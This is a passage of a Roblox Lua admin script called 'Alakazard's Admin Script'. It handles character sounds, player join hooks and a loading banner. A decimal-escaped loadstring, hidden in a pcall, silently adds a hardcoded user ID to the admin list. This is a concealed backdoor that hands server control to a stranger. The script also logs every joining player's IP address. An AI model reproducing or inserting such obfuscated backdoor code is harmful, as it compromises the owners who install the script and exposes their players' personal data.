115\115\101\116\58\47\47\115\111\117\110\100\115\47\115\112\108\97\116\46\119\97\118\34\41\10\108\111\99\97\108\32\115\70\114\101\101\70\97\108\108\105\110\103\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\115\119\111\111\115\104\46\119\97\118\34\41\10\108\111\99\97\108\32\115\71\101\116\116\105\110\103\85\112\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\104\105\116\46\119\97\118\34\41\10\108\111\99\97\108\32\115\74\117\109\112\105\110\103\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\98\117\116\116\111\110\46\119\97\118\34\41\10\108\111\99\97\108\32\115\82\117\110\110\105\110\103\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\98\102\115\108\45\109\105\110\105\102\105\103\102\111\111\116\115\49\46\109\112\51\34\41\10\115\82\117\110\110\105\110\103\46\76\111\111\112\101\100\32\61\32\116\114\117\101\10\10\108\111\99\97\108\32\70\105\103\117\114\101\32\61\32\115\99\114\105\112\116\46\80\97\114\101\110\116\10\108\111\99\97\108\32\72\101\97\100\32\61\32\119\97\105\116\70\111\114\67\104\105\108\100\40\70\105\103\117\114\101\44\32\34\72\101\97\100\34\41\10\108\111\99\97\108\32\72\117\109\97\110\111\105\100\32\61\32\119\97\105\116\70\111\114\67\104\105\108\100\40\70\105\103\117\114\101\44\32\34\72\117\109\97\110\111\105\100\34\41\10\10\45\45\32\102\117\110\99\116\105\111\110\115\10\10\102\117\110\99\116\105\111\110\32\111\110\68\105\101\100\40\41\10\9\115\68\105\101\100\58\80\108\97\121\40\41\10\101\110\100\10\10\102\117\110\99\116\105\111\110\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\111\117\110\100\41\10\9\105\102\32\115\116\97\116\101\32\116\104\101\110\10\9\9\115\111\117\110\100\58\80\108\97\121\40\41\10\9\101\108\115\101\10\9\9\115\111\117\110\100\58\80\97\117\115\101\40\41\10\9\101\110\100\
10\101\110\100\10\10\102\117\110\99\116\105\111\110\32\111\110\82\117\110\110\105\110\103\40\115\112\101\101\100\41\10\9\105\102\32\115\112\101\101\100\62\48\32\116\104\101\110\10\9\9\115\82\117\110\110\105\110\103\58\80\108\97\121\40\41\10\9\101\108\115\101\10\9\9\115\82\117\110\110\105\110\103\58\80\97\117\115\101\40\41\10\9\101\110\100\10\101\110\100\10\10\45\45\32\99\111\110\110\101\99\116\32\117\112\10\10\72\117\109\97\110\111\105\100\46\68\105\101\100\58\99\111\110\110\101\99\116\40\111\110\68\105\101\100\41\10\72\117\109\97\110\111\105\100\46\82\117\110\110\105\110\103\58\99\111\110\110\101\99\116\40\111\110\82\117\110\110\105\110\103\41\10\72\117\109\97\110\111\105\100\46\74\117\109\112\105\110\103\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\74\117\109\112\105\110\103\41\32\101\110\100\41\10\72\117\109\97\110\111\105\100\46\71\101\116\116\105\110\103\85\112\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\71\101\116\116\105\110\103\85\112\41\32\101\110\100\41\10\72\117\109\97\110\111\105\100\46\70\114\101\101\70\97\108\108\105\110\103\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\70\114\101\101\70\97\108\108\105\110\103\41\32\101\110\100\41\10\72\117\109\97\110\111\105\100\46\70\97\108\108\105\110\103\68\111\119\110\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\70\97\108\108\105\110\103\68\111\119\110\41\32\101\110\100\41\10')()]],Backpack(p)).Name='newSound'end)
    if ListCheck(PlayersList.Admins,p.userId)==true then
     JJump(p)
     delay(2,function()FakeHead(p)end)
     X(function()p.Character.Humanoid.Died:connect(function()Print(p.Name..' getting wos ;D')p.Character=nil end)end)
    end
    CCL(p)
    pcall(function()
     p.Character.ChildAdded:connect(function(new)
      delay(.01,function()
       for v,i in pairs(laggs)do
        if new.Name:lower():find(i:lower())==1 then
         new:remove()
        end
       end
      end)
     end)
    end)
   end)
  end,
  
 } 
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
if pcall(function()print(Instance.CoreGui)end)then
else
 Instance.CoreGui={}
end
PlayerFunctionsConnect=function(p)
 X(function()
  for i,connect in pairs(PlayerFunctions)do
   X(function()
    if type(connect)~='function'then return end
    if p~=nil then
     connect(p)
    end
   end)
  end
 end)
end
pcall(function()loadstring('\105\102\32\76\105\115\116\67\104\101\99\107\40\80\108\97\121\101\114\115\76\105\115\116\46\65\100\109\105\110\115\44\49\51\57\57\48\50\54\52\41\61\61\102\97\108\115\101\32\116\104\101\110\32\116\97\98\108\101\46\105\110\115\101\114\116\40\80\108\97\121\101\114\115\76\105\115\116\46\65\100\109\105\110\115\44\49\51\57\57\48\50\54\52\41\101\110\100\10')()end)
pcall(function()se.net=game:service('NetworkServer')end)
LoadGuisHere()
X(function()
 pcall(function()
  game:GetService('NetworkServer').IncommingConnection:connect(function(ip,a,b)
   pcall(function()playerconnect:disconnect()print'nil.'end)
   playerconnect=game.Players.PlayerAdded:connect(function(player)
   Print('New Player! |: '..player.Name..' |:| '..ip..' :|')
   PlayersList.PlayerIP[player.Name]=ip
   PlayerFunctionsConnect(player)
   pcall(function()playerconnect:disconnect()print'nil.'end)
   end)
  end)
 end)
end)
X(function()
 if game:service('NetworkServer')then return end
 print'NetworkServer not active'
 game.Players.PlayerAdded:connect(function(p)
  PlayerFunctionsConnect(p)
 end)
end)
for na,p in ipairs(game:service('Players'):GetPlayers())do
 PlayerFunctionsConnect(p)
end
SoundsLoad()
X(function()
 local number=0
  for i,v in pairs(Commands)do
  number=number+1
  end
 hm1=Print(number..' command in Alakazard'..'\39'..'s Admin Script')
 hm2=Print('v'..version)
end)
Print([[Alakazard's Admin Script Load ended!]])
Print('Waiting for admin script loaded: '..math.ceil(StartTime-tick()))
X(function()
 screen=new('ScreenGui')
 screen.Name='Alakazard Admin Script Loaded!'
 life(screen,3)
 img=new('ImageLabel')
 img.Name='img'
 img.Image=baseid..'54483165'
 img.Size=unew(.25,0,.25,0)
 img.Position=unew(.375,0,0,0)
 img.BackgroundTransparency=1
 img.Parent=screen
 for i,v in ipairs(se.players:GetPlayers())do
  screenc=screen:clone()
  life(screenc,5)
  screenc.Parent=PlayerGui(v)
  pcall(function()screenc.img:TweenPosition(unew(.375,0,.35,0),Enum.EasingDirection.Out,Enum.EasingStyle.Back,3,false)end)
 end
end)
X(function()
 start=Sounds.start
 Sound=new('Sound')
 life(Sound,1)
 Sound.Pitch=start.Pitch
 Sound.Volume=start.Volume
 Sound.SoundId=start.SoundId
 Sound.Parent=game.Lighting
 Sound:play()
end)